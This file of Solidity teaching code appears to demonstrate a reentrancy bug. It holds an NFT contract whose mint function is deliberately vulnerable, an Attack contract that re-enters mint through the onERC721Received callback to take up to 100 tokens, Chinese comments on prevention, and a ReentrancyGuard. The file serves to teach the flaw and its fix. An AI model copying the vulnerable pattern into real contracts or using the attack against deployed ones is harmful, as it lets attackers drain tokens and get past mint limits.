// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;

    constructor() ERC721("Reentry NFT", "ReNFT"){}

    function mint() payable external {
        require(mintedAddress[msg.sender] == false);
        totalSupply++;
        _safeMint(msg.sender , totalSupply);
        mintedAddress[msg.sender] = true;
    }
    
}

contract Attack is IERC721Receiver {
    NFTReentrancy public nft;

    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }

    function attack() external {
        nft.mint();
    }

    function onERC721Received(address , address , uint256 , bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 100) {
            nft.mint();
        }
        return this.onERC721Received.selector;            
    }
}

//预防措施：先检查地址是否mint过，再进行safeMint
//加入重入锁，使用OpenZeppelin提供的ReentrancyGuard

abstract contract ReentrancyGuard {
    
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        _status = _NOT_ENTERED;
    }

    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}